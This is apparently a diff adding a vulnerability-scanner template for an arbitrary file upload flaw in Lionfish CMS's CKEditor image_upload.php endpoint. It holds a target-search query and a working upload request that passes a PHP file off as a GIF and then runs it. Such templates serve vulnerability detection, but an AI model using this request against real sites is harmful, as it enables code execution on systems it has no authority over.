@@ -1,0 +1,59 @@
+id: shiziyu-image_upload-fileupload
+info:
+  name: Lionfish CMS image_upload.php Arbitrary File Upload Vulnerability
+  author:
+  - zxcv
+  tags:
+  - fileupload
+  - shiziyu
+  description: |-
+    Lionfish CMS image_upload.php Arbitrary File Upload Vulnerability
+    Lionfish CMS uses the CKEditor and has an image upload bypass, resulting in arbitrary file upload via image_upload.php.
+  severity: high
+  metadata:
+    fofa-query: /seller.php?s=/Public/login
+    verified: true
+  remediation: Upgrade to the latest version
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1 == 200
+    - contains(body_1, "{\"result\":\"200\",\"imgurl\":\"image/uploads")
+    - status_code_2==200
+    - contains(body_2, "PHP Version")
+  extractors:
+  - name: uploadFile
+    type: regex
+    regex:
+    - '"result":"200","imgurl":"(.+\.php)"'
+    group: 1
+    part: body
+    internal: true
+  raw:
+  - |
+    POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------395196955720873782481927711505
+    Content-Length: 255
+    Connection: close
+    Cookie: PHPSESSID=2pghk16kb7ad240mdt3satr1d2
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: cross-site
+    Sec-Fetch-User: ?1
+
+    -----------------------------395196955720873782481927711505
+    Content-Disposition: form-data; name="files"; filename="aa.php"
+    Content-Type: image/gif
+
+    <?php phpinfo(); unlink(__FILE__);?>
+    -----------------------------395196955720873782481927711505--
+  - "GET /Common/{{uploadFile}} HTTP/1.1\nHost: {{Hostname}}       \n"
+  req-condition: true
